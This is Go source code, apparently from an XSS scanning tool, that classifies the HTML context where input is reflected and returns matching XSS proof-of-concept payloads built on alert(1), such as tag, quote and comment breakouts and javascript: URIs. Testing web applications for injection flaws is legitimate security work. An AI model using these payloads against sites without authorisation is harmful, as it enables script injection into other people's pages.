package scanner

import (
	"regexp"
	"strings"

	"github.com/lcalzada-xor/xxss/models"
)

// DetectContext analyzes the HTML around the probe to determine reflection context
func DetectContext(body, probe string) models.ReflectionContext {
	// Find first occurrence of probe
	index := strings.Index(body, probe)
	if index == -1 {
		return models.ContextUnknown
	}

	// Get surrounding context (500 chars before and after)
	start := max(0, index-500)
	end := min(len(body), index+len(probe)+500)
	context := body[start:end]

	// Check contexts in order of specificity
	if isInComment(context, probe) {
		return models.ContextComment
	}

	if isInMetaRefresh(context, probe) {
		return models.ContextMetaRefresh
	}

	if isInDataURI(context, probe) {
		return models.ContextDataURI
	}

	if isInSVG(context, probe) {
		return models.ContextSVG
	}

	if isInTemplateLiteral(context, probe) {
		return models.ContextTemplateLiteral
	}

	if isJS, jsContext := analyzeJavaScriptContext(context, probe); isJS {
		return jsContext
	}

	if isInCSS(context, probe) {
		return models.ContextCSS
	}

	if isInURL(context, probe) {
		return models.ContextURL
	}

	if isInTagName(context, probe) {
		return models.ContextTagName
	}

	if isInRCDATA(context, probe) {
		return models.ContextRCDATA
	}

	if isInAttribute(context, probe) {
		return models.ContextAttribute
	}

	// Default to HTML
	return models.ContextHTML
}

func analyzeJavaScriptContext(context, probe string) (bool, models.ReflectionContext) {
	// Check if inside <script> tags
	scriptPattern := regexp.MustCompile(`(?i)<script[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</script>`)
	if scriptPattern.MatchString(context) {
		return determineJSQuoteContext(context, probe)
	}

	// Check for inline event handlers (onclick, onload, etc.)
	// Need to verify probe is INSIDE the event handler value, not after it
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false, models.ContextUnknown
	}

	before := context[:probeIndex]

	// Look for event handler pattern before probe
	eventPattern := regexp.MustCompile(`(?i)on\w+\s*=\s*["']?[^"'>]*$`)
	if !eventPattern.MatchString(before) {
		return false, models.ContextUnknown
	}

	// Find last < and > to ensure we're in a tag
	lastTagStart := strings.LastIndex(before, "<")
	lastTagEnd := strings.LastIndex(before, ">")

	if lastTagEnd > lastTagStart {
		return false, models.ContextUnknown // Not inside a tag
	}

	// Count quotes to see if we're inside the event handler value
	afterEvent := before[lastTagStart:]
	doubleQuotes := strings.Count(afterEvent, "\"")
	singleQuotes := strings.Count(afterEvent, "'")

	// Odd number of quotes means we're inside
	if (doubleQuotes%2 == 1) || (singleQuotes%2 == 1) {
		return determineJSQuoteContext(context, probe)
	}

	return false, models.ContextUnknown
}

func determineJSQuoteContext(context, probe string) (bool, models.ReflectionContext) {
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false, models.ContextUnknown
	}

	before := context[:probeIndex]

	// Simple check for quotes immediately preceding the probe (ignoring whitespace/operators for now)
	// A more robust parser would be better, but this covers simple cases like var x = 'PROBE'

	// Count quotes in the line/block before the probe to determine state
	// This is tricky without a full parser.
	// Heuristic: Look at the last quote character before the probe.

	// Find last single and double quotes
	lastSquote := strings.LastIndex(before, "'")
	lastDquote := strings.LastIndex(before, "\"")

	// Check if we are inside a string based on quote counts from the start of the relevant block
	// For simplicity, let's look at the closest quote.

	if lastSquote > lastDquote {
		// Potential single quote context. Check if it's an opening quote.
		// If count of single quotes before is odd, we are likely inside.
		if strings.Count(before, "'")%2 != 0 {
			return true, models.ContextJSSingleQuote
		}
	} else if lastDquote > lastSquote {
		// Potential double quote context
		if strings.Count(before, "\"")%2 != 0 {
			return true, models.ContextJSDoubleQuote
		}
	}

	// If no active quotes, it's raw JS
	return true, models.ContextJSRaw
}

func isInCSS(context, probe string) bool {
	// Check if inside <style> tags
	stylePattern := regexp.MustCompile(`(?i)<style[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</style>`)
	if stylePattern.MatchString(context) {
		return true
	}

	// Check for inline style attribute - verify probe is INSIDE the style value
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	before := context[:probeIndex]

	// Look for style= pattern before probe
	styleAttrPattern := regexp.MustCompile(`(?i)style\s*=\s*["']?[^"'>]*$`)
	if !styleAttrPattern.MatchString(before) {
		return false
	}

	// Find last < and > to ensure we're in a tag
	lastTagStart := strings.LastIndex(before, "<")
	lastTagEnd := strings.LastIndex(before, ">")

	if lastTagEnd > lastTagStart {
		return false // Not inside a tag
	}

	// Count quotes to see if we're inside the style value
	afterStyle := before[lastTagStart:]
	doubleQuotes := strings.Count(afterStyle, "\"")
	singleQuotes := strings.Count(afterStyle, "'")

	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInAttribute(context, probe string) bool {
	// Check if inside HTML tag attribute value
	// We need to be more precise: the probe must be INSIDE the attribute value
	// Pattern: <tag attr="...probe..." or <tag attr='...probe...'
	// NOT just: <tag attr="value"> probe (which would be HTML context)

	// Find the probe position
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	// Look backwards from probe to find if we're inside quotes within a tag
	before := context[:probeIndex]

	// Find the last < before the probe
	lastTagStart := strings.LastIndex(before, "<")
	// Find the last > before the probe
	lastTagEnd := strings.LastIndex(before, ">")

	// If the last > is after the last <, we're NOT inside a tag
	if lastTagEnd > lastTagStart {
		return false
	}

	// We're potentially inside a tag, now check if we're inside an attribute value
	// Count quotes after the last <
	afterTagStart := before[lastTagStart:]
	doubleQuotes := strings.Count(afterTagStart, "\"")
	singleQuotes := strings.Count(afterTagStart, "'")

	// If odd number of quotes, we're inside an attribute value
	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInURL(context, probe string) bool {
	// Check if inside href, src, action, data attributes
	// Need to verify probe is INSIDE the URL value
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	before := context[:probeIndex]

	// Look for URL attribute pattern before probe
	urlAttrPattern := regexp.MustCompile(`(?i)(href|src|action|data|formaction)\s*=\s*["']?[^"'>]*$`)
	if !urlAttrPattern.MatchString(before) {
		return false
	}

	// Find last < and > to ensure we're in a tag
	lastTagStart := strings.LastIndex(before, "<")
	lastTagEnd := strings.LastIndex(before, ">")

	if lastTagEnd > lastTagStart {
		return false // Not inside a tag
	}

	// Count quotes to see if we're inside the URL value
	afterAttr := before[lastTagStart:]
	doubleQuotes := strings.Count(afterAttr, "\"")
	singleQuotes := strings.Count(afterAttr, "'")

	return (doubleQuotes%2 == 1) || (singleQuotes%2 == 1)
}

func isInComment(context, probe string) bool {
	// Check if inside HTML comment
	commentPattern := regexp.MustCompile(`<!--[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?-->`)
	return commentPattern.MatchString(context)
}

func isInTagName(context, probe string) bool {
	probeIndex := strings.Index(context, probe)
	if probeIndex == -1 {
		return false
	}

	before := context[:probeIndex]
	after := context[probeIndex+len(probe):]

	// Check if there's a < before and no > between < and probe
	lastLt := strings.LastIndex(before, "<")
	lastGt := strings.LastIndex(before, ">")

	if lastLt == -1 || lastGt > lastLt {
		return false
	}

	// Check if probe is before first space or >
	// If we are in tag name, we expect no space between < and probe (or just whitespace)
	// And we expect a space or > after the probe

	// Check if we are right after <
	between := before[lastLt+1:]
	if strings.TrimSpace(between) != "" {
		return false // Not a tag name if there's stuff between < and probe
	}

	afterProbe := strings.TrimLeft(after, " \t\n\r")
	if len(afterProbe) > 0 && (afterProbe[0] == '>' || afterProbe[0] == ' ' || afterProbe[0] == '/') {
		return true
	}

	return false
}

func isInRCDATA(context, probe string) bool {
	// Check for <title> or <textarea>
	titlePattern := regexp.MustCompile(`(?i)<title[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</title>`)
	if titlePattern.MatchString(context) {
		return true
	}

	textareaPattern := regexp.MustCompile(`(?i)<textarea[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</textarea>`)
	return textareaPattern.MatchString(context)
}

// isInTemplateLiteral checks if probe is inside JavaScript template literal
func isInTemplateLiteral(context, probe string) bool {
	// Check for template literal syntax: `...${probe}...`
	templateLiteralPattern := regexp.MustCompile("`[^`]*\\$\\{[^}]*" + regexp.QuoteMeta(probe) + "[^}]*\\}[^`]*`")
	if templateLiteralPattern.MatchString(context) {
		return true
	}
	// Also check for simple backtick strings
	backtickPattern := regexp.MustCompile("`[^`]*" + regexp.QuoteMeta(probe) + "[^`]*`")
	return backtickPattern.MatchString(context)
}

// isInSVG checks if probe is inside SVG context
func isInSVG(context, probe string) bool {
	// Check if inside <svg> tags
	svgPattern := regexp.MustCompile(`(?i)<svg[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</svg>`)
	if svgPattern.MatchString(context) {
		return true
	}
	// Check for SVG-specific tags
	svgTagsPattern := regexp.MustCompile(`(?i)<(animate|animateTransform|set|animateMotion|path|circle|rect|line|ellipse|polygon|polyline|text|tspan|image)[^>]*` + regexp.QuoteMeta(probe))
	return svgTagsPattern.MatchString(context)
}

// isInMetaRefresh checks if probe is inside meta refresh tag
func isInMetaRefresh(context, probe string) bool {
	// Check for meta refresh with URL
	metaRefreshPattern := regexp.MustCompile(`(?i)<meta[^>]*http-equiv=["']?refresh["']?[^>]*content=["'][^"']*` + regexp.QuoteMeta(probe))
	return metaRefreshPattern.MatchString(context)
}

// isInDataURI checks if probe is inside a data URI
func isInDataURI(context, probe string) bool {
	// Check for data: URI scheme
	dataURIPattern := regexp.MustCompile(`(?i)(href|src|action|data|formaction)\s*=\s*["']?data:[^"'\s>]*` + regexp.QuoteMeta(probe))
	return dataURIPattern.MatchString(context)
}

// GetSuggestedPayload returns a context-specific XSS payload
func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
	// Check which characters are available
	hasLt := contains(unfiltered, "<")
	hasGt := contains(unfiltered, ">")
	hasDquote := contains(unfiltered, "\"")
	hasSquote := contains(unfiltered, "'")
	hasQuote := hasDquote || hasSquote
	hasSpace := contains(unfiltered, " ")
	hasEquals := contains(unfiltered, "=")
	hasSlash := contains(unfiltered, "/")
	hasParen := contains(unfiltered, "(") && contains(unfiltered, ")")

	switch context {
	case models.ContextHTML:
		if hasLt && hasGt {
			if hasSpace && hasEquals {
				// XSS without quotes
				return "<img src=x onerror=alert(1)>"
			}
			if hasSlash {
				return "<script>alert(1)</script>"
			}
			return "<svg onload=alert(1)>"
		}

	case models.ContextJSSingleQuote:
		if hasSquote {
			return "';alert(1);//"
		}
		// Fallback if single quote is filtered but we are in single quote context (hard to exploit)

	case models.ContextJSDoubleQuote:
		if hasDquote {
			return "\";alert(1);//"
		}

	case models.ContextJSRaw:
		if hasParen {
			return ";alert(1);//"
		}
		return "alert(1)"

	case models.ContextJavaScript: // Deprecated fallback
		if hasSquote {
			return "';alert(1);//"
		}
		if hasDquote {
			return "\";alert(1);//"
		}
		if hasParen {
			return ";alert(1);//"
		}

	case models.ContextAttribute:
		// Priority 1: If we have < and >, break out of tag completely
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Priority 2: If we have quotes and space, use event handler
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onmouseover=" + quote + "alert(1)"
		}

	case models.ContextCSS:
		if hasParen {
			return "expression(alert(1))"
		}
		return "x:expression(alert(1))"

	case models.ContextURL:
		// Priority 1: Break out of tag (same as Attribute)
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Priority 2: Javascript protocol
		return "javascript:alert(1)"

	case models.ContextTemplateLiteral:
		// Break out of template literal
		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
			return "${alert(1)}"
		}
		if contains(unfiltered, "`") {
			return "`+alert(1)+`"
		}
		return "';alert(1);//"

	case models.ContextSVG:
		// SVG-specific XSS
		if hasLt && hasGt {
			return "<set attributeName=onmouseover value=alert(1)>"
		}
		if hasQuote && hasSpace {
			quote := "'"
			if hasDquote {
				quote = "\""
			}
			return quote + " onload=" + quote + "alert(1)"
		}
		return "<animate onbegin=alert(1)>"

	case models.ContextMetaRefresh:
		// Meta refresh URL injection
		return "javascript:alert(1)"

	case models.ContextDataURI:
		// Data URI XSS
		return "data:text/html,<script>alert(1)</script>"

	case models.ContextComment:
		if hasGt && hasLt {
			return "--><script>alert(1)</script><!--"
		}

	case models.ContextTagName:
		if hasGt && hasSpace && hasEquals {
			return " onload=alert(1)>"
		}
		if hasGt && hasLt {
			return "><script>alert(1)</script>"
		}

	case models.ContextRCDATA:
		if hasLt && hasGt && hasSlash {
			return "</title><script>alert(1)</script>" // Works for textarea too as generic closer
		}
	}

	return ""
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
